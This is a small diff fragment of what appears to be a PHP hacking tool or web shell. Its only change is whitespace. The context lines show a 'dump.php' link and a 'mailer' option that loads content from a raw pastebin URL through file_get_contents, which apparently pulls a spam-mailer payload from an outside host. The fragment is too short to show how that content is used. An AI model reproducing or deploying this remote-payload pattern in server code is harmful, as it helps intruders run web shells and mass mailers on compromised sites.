@@ -79,7 +79,7 @@ if(isset($submit)) {
 		echo "<a href="."dump.php"." target=_blank><b>dump.php</b></a></center>";
 		die();
 		}
-		
+	
 		///mailer
 		elseif ( $pilih == 'mailer') {
 	$files = file_get_contents("http://pastebin.com/raw/Drdu0tGG");
